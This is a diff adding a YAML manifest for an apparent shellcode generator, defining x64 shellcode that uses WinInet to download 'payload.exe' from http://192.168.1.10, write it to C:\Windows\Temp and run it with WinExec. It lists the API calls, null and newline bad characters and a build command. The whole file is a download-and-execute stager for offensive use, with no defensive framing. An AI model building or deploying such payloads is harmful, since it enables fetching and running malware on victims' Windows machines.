@@ -1,0 +1,42 @@
+# HTTP download via WinInet + execute - x64
+# IR workflow: InternetOpenA -> InternetOpenUrlA -> VirtualAlloc ->
+# InternetReadFile -> CreateFileA -> WriteFile -> WinExec
+#
+# Build:
+#   uv run emitrion-x64 emitrion/manifests/x64/http_download_x64.yaml \
+#       --url "http://192.168.1.10/payload.exe" \
+#       --dst "C:\Windows\Temp\payload.exe" \
+#       --out emitter_out/
+arch: x64
+template: ir_http_download
+badchars: ["00", "0A", "0D"]
+
+functions:
+  - LoadLibraryA
+  - InternetOpenA
+  - InternetOpenUrlA
+  - InternetReadFile
+  - InternetCloseHandle
+  - VirtualAlloc
+  - CreateFileA
+  - WriteFile
+  - CloseHandle
+  - WinExec
+  - ExitProcess
+
+strings:
+  - label: wininet_dll
+    value: wininet.dll
+    method: push
+  - label: user_agent
+    value: "Mozilla/5.0"
+    method: mov
+    dest: rdi
+  - label: url
+    value: "http://192.168.1.10/payload.exe"
+    method: mov
+    dest: rdi
+  - label: dst_path
+    value: "C:\\Windows\\Temp\\payload.exe"
+    method: mov
+    dest: rdi
